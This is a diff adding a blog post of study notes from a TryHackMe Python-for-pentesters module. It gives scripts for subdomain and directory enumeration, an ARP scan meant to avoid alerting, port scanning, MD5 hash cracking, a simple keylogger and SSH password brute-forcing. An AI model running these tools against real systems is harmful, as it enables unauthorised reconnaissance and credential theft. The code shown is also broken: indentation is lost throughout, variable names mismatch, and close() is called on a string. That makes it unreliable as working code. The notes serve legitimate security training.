@@ -1,0 +1,205 @@
+---
+title: 'TryHackMe: Web Fundamentals (Supplements)'
+date: 2022-02-01 06:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-02-01-tryhackme-web-fundamentals-supplements.html
+author: 100007
+---
+
+<h1 id="tryhackme-web-fundamentals-supplements">TryHackMe: Web Fundamentals (Supplements)</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-02-01</p>
+<h2 id="inclusion">Inclusion</h2>
+<p><a href="https://cardboard-iguana.com/notes/tryhackme-inclusion.html">See my Inclusion CTF write-up.</a></p>
+<h2 id="python-for-pentesters">Python for Pentesters</h2>
+<h3 id="introduction">Introduction</h3>
+<p>Two Python packages to bundle up a script as a Windows EXE: <code class="language-plaintext highlighter-rouge">pyinstaller</code> (which is the one everyone uses) and <code class="language-plaintext highlighter-rouge">Py2exe</code>.</p>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># The script will use a list of potential subdomains and
+# prepends them to the domain name provided via a
+# command-line argument.
+#
+# The script then tries to connect to the subdomains and
+# assumes the ones that accept the connection exist.
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"wordlist.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">subdoms</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">sub</span> <span class="ow">in</span> <span class="n">subdoms</span><span class="p">:</span>
+<span class="n">sub_domain</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">&#x007b;</span><span class="n">sub</span><span class="si">&#x007d;</span><span class="s">.</span><span class="si">&#x007b;</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">&#x007d;</span><span class="s">"</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">sub_domains</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="nb">ConnectionError</span><span class="p">:</span>
+<span class="k">pass</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Valid domain: "</span><span class="p">,</span> <span class="n">sub_domains</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Note that the <code class="language-plaintext highlighter-rouge">f</code> above isn’t a mistake – rather it’s the use of an “f-string”, which allows the expansion of <code class="language-plaintext highlighter-rouge">&#x007b;sys&#x007d;</code> and <code class="language-plaintext highlighter-rouge">&#x007b;sys.argv[1]&#x007d;</code>. This requires Python 3.6+.</p>
+<ul>
+<li><a href="https://whatisanything.com/how-do-you-write-an-f-string-in-python/">Quick Answer: How Do You Write An F String In Python</a></li>
+</ul>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># A simple directory enumeration tool.
+#
+# Expects a wordlist.txt in the working directory and
+# appends it to a domain name provided via a command-line
+# argument.
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">sub_list</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"wordlist.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">directories</span> <span class="o">=</span> <span class="n">sub_list</span><span class="p">.</span><span class="n">splitlines</span><span class="p">()</span>
+<span class="k">for</span> <span class="nb">dir</span> <span class="ow">in</span> <span class="n">directories</span><span class="p">:</span>
+<span class="n">dir_enum</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">&#x007b;</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">&#x007d;</span><span class="s">/</span><span class="si">&#x007b;</span><span class="nb">dir</span><span class="si">&#x007d;</span><span class="s">/"</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">dir_enum</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">404</span><span class="p">:</span>
+<span class="k">pass</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Valid directory:"</span><span class="p">,</span> <span class="n">dir_enum</span><span class="p">)</span>
+</code></pre></div></div>
+<p>This requires Python 3.6+.</p>
+<h3 id="network-scanner">Network Scanner</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Scans the given IP range on the given network using ARP
+# rather than ICMP to help bypass potential alerting.
+</span>
+<span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">interface</span> <span class="o">=</span> <span class="s">"eth0"</span>
+<span class="n">ip_range</span> <span class="o">=</span> <span class="s">"10.10.X.X/24"</span>
+<span class="n">broadcastMac</span> <span class="o">=</span> <span class="s">"ff:ff:ff:ff:ff:ff"</span>
+<span class="n">packet</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="n">broadcastMac</span><span class="p">)</span> <span class="o">/</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span> <span class="o">=</span> <span class="n">ip_range</span><span class="p">)</span>
+<span class="n">ans</span><span class="p">,</span> <span class="n">unans</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span> <span class="n">iface</span> <span class="o">=</span> <span class="n">interface</span><span class="p">,</span> <span class="n">inter</span> <span class="o">=</span> <span class="mf">0.1</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">send</span><span class="p">,</span> <span class="n">receive</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">.</span><span class="n">sprintf</span><span class="p">(</span><span class="sa">r</span><span class="s">"%Ether.src% - %ARP.psrc%"</span><span class="p">))</span>
+</code></pre></div></div>
+<p>As above, the <code class="language-plaintext highlighter-rouge">r</code> here isn’t a mistake – rather it specifies a “raw string”. This again requires Python 3.6+.</p>
+<ul>
+<li><a href="https://whatisanything.com/how-do-you-write-an-f-string-in-python/">Quick Answer: How Do You Write An F String In Python</a></li>
+</ul>
+<h3 id="port-scanner">Port Scanner</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Look for open ports on the specified IP address.
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'192.168.1.6'</span>
+<span class="c1"># Alternately: ip = socket.gethostbyname(sys.argv[1])
+</span>
+<span class="n">ports</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
+<span class="c1"># Alternately: ports = &#x007b;21, 22, 23, 53, 80, 135, 443, 445&#x007d;
+</span>
+<span class="n">open_ports</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">def</span> <span class="nf">probe_port</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<span class="n">result</span> <span class="o">=</span> <span class="n">r</span>
+<span class="n">sock</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<span class="k">pass</span>
+<span class="k">return</span> <span class="n">result</span>
+<span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">ports</span><span class="p">:</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">probe_port</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<span class="n">open_ports</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">open_ports</span><span class="p">:</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">"Open Ports are: "</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="nb">sorted</span><span class="p">(</span><span class="n">open_ports</span><span class="p">))</span>
+<span class="k">else</span><span class="p">:</span>
+<span class="k">print</span> <span class="p">(</span><span class="s">"Looks like no ports are open :("</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The alternate port list above represents common ports that are used on internal corporate networks.</p>
+<p>Note that this is making a full TCP handshake, so it’s going to be slooooooow. There’s no output in this script until the end, so if you want to check on progress you’ll need to try something like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat | <span class="nb">grep</span> <span class="nv">$IP</span>
+</code></pre></div></div>
+<h3 id="file-downloader">File Downloader</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Download a file with Python.
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s">'https://assets.tryhackme.com/img/THMlogo.png'</span>
+<span class="n">outfile</span> <span class="o">=</span> <span class="s">'THMlogo.png'</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_redirects</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
+<span class="nb">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">).</span><span class="n">write</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="hash-cracker">Hash Cracker</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Given a wordlist, crack a (MD5) hash.
+</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="n">wordlist_location</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Enter wordlist file location: '</span><span class="p">))</span>
+<span class="n">hash_input</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Enter hash to be cracked: '</span><span class="p">))</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist_location</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+<span class="n">hash_ob</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">().</span><span class="n">encode</span><span class="p">())</span>
+<span class="c1"># See hashlib.algorithms_available() for options
+</span> <span class="c1"># besides hashlib.md5().
+</span>
+<span class="n">hashed_pass</span> <span class="o">=</span> <span class="n">hash_ob</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">hashed_pass</span> <span class="o">==</span> <span class="n">hash_input</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'Found cleartext password: '</span> <span class="o">+</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="keyloggers">Keyloggers</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Records all keystrokes up until "Enter", then replays
+# them. Note that the "keyboard" module does *not* seem
+# to be available on most systems out-of-the-box, and
+# will need to be installed using pip.
+</span>
+<span class="kn">import</span> <span class="nn">keyboard</span>
+<span class="n">keys</span> <span class="o">=</span> <span class="n">keyboard</span><span class="p">.</span><span class="n">record</span><span class="p">(</span><span class="n">until</span> <span class="o">=</span> <span class="s">'ENTER'</span><span class="p">)</span>
+<span class="n">keyboard</span><span class="p">.</span><span class="n">play</span><span class="p">(</span><span class="n">keys</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="ssh-brute-forcing">SSH Brute Forcing</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="c1"># Attempt to brute force an SSH login given a (cleartext)
+# password list.
+</span>
+<span class="kn">import</span> <span class="nn">paramiko</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="n">target</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter target IP address: '</span><span class="p">))</span>
+<span class="n">username</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter username to bruteforce: '</span><span class="p">))</span>
+<span class="n">password_file</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s">'Please enter location of the password file: '</span><span class="p">))</span>
+<span class="c1"># Alternately: Use sys.argv[] to specify some/all of these.
+</span>
+<span class="k">def</span> <span class="nf">ssh_connect</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">code</span> <span class="o">=</span> <span class="mi">0</span><span class="p">):</span>
+<span class="n">ssh</span> <span class="o">=</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">SSHClient</span><span class="p">()</span>
+<span class="n">ssh</span><span class="p">.</span><span class="n">set_missing_host_key_policy</span><span class="p">(</span><span class="n">paramiko</span><span class="p">.</span><span class="n">AutoAddPolicy</span><span class="p">())</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">ssh</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">22</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">paramiko</span><span class="p">.</span><span class="n">AuthenticationException</span><span class="p">:</span>
+<span class="n">code</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">ssh</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="k">return</span> <span class="n">code</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">password_file</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+<span class="n">password</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">ssh_connect</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'password found: '</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
+<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">response</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'no luck'</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+<span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<span class="k">pass</span>
+<span class="n">password_file</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Note that, like the port scanner earlier, this is slooooooow… (At least it provides us with some feedback that it’s actually working though.)</p>
